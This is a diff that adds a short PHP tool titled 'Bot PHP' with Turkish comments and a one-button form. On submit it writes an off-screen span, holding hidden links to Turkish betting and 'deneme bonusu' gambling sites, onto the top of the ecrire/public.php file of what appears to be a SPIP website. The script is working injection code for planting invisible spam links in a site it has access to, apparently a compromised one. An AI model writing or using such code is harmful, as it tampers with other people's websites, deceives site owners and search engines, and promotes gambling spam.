@@ -1,0 +1,60 @@
+<?php
+
+// Backlink ekleme işlemi
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Eklenecek backlink kodu
+    $backlinkCode = '<span style="position: absolute; left: -8355px;">
+<a href="https://denemebonuscun.com" title="deneme bonusu" target="_blank">deneme bonusu</a>
+<a href="https://murrayhughes.com" title="deneme bonusu veren siteler" target="_blank">deneme bonusu veren siteler</a>
+<a href="https://dinamobetresmi.com" title="Dinamobet" target="_blank">Dinamobet</a>
+<a href="https://dinamobetdestek.com" title="Dinamobet Sitesi" target="_blank">Dinamobet Sitesi</a>
+<a href="https://dinamobet-tr.com" title="Dinamobet-tr.com" target="_blank">Dinamobet-tr.com</a>
+<a href="https://dinamobetsitesi.com" title="Dinamobetsitesi.com" target="_blank">Dinamobetsitesi.com</a>
+<a href="https://dinamobetkayit.com" title="Dinamobetkayit.com" target="_blank">Dinamobetkayit.com</a>
+
+
+</span>' . PHP_EOL;
+
+    // Ecrire klasörünün yolu
+    $ecrireDir = __DIR__ . DIRECTORY_SEPARATOR . 'ecrire';
+
+    // public.php dosyasının yolu
+    $publicFilePath = $ecrireDir . DIRECTORY_SEPARATOR . 'public.php';
+
+    // public.php dosyasını kontrol ve düzenleme işlemi
+    if (file_exists($publicFilePath)) {
+        // Dosya içeriğini oku
+        $fileContents = file_get_contents($publicFilePath);
+
+        // Backlink zaten var mı kontrol et
+        if (strpos($fileContents, $backlinkCode) === false) {
+            // Backlinki dosyanın en üstüne ekle
+            $newContents = $backlinkCode . $fileContents;
+
+            // Dosyayı yeni içerikle yaz
+            if (file_put_contents($publicFilePath, $newContents)) {
+                echo "Backlink başarıyla eklendi: $publicFilePath\n";
+            } else {
+                echo "Dosyaya yazma hatası: $publicFilePath\n";
+            }
+        } else {
+            echo "Backlink zaten mevcut: $publicFilePath\n";
+        }
+    } else {
+        echo "public.php dosyası bulunamadı: $publicFilePath\n";
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bot PHP</title>
+</head>
+<body>
+    <form method="post">
+        <button type="submit">EKLE</button>
+    </form>
+</body>
+</html>
